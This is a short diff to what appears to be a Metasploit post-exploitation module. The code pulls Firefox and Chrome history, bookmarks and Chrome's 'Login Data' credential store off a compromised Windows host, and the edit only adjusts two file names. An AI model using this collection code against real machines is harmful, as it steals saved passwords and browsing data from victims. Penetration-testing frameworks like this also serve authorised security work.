@@ -42,8 +42,8 @@ class Metasploit3 < Msf::Post
        firefox_download = download_artifact("AppData",p,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(p['AppData'],p['UserName'],"Firefox","Mozilla")
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
     end
   end   
     
